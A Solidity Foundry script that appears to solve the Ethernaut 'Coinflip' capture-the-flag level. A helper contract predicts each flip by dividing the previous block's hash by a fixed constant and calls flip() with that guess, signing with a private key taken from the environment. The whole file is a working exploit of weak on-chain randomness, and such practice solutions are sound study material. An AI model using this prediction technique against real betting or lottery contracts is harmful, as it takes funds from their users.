// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Coinflip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor (Coinflip _coinflipInstance) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _coinflipInstance.flip(side);
    }
}
contract CoinFlipSolution is Script {
    // create contract instance
    Coinflip public coinflipInstance = Coinflip(0xB4B17afD0779E053C8Cb3ce1AA5c61AF0d97eA35);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
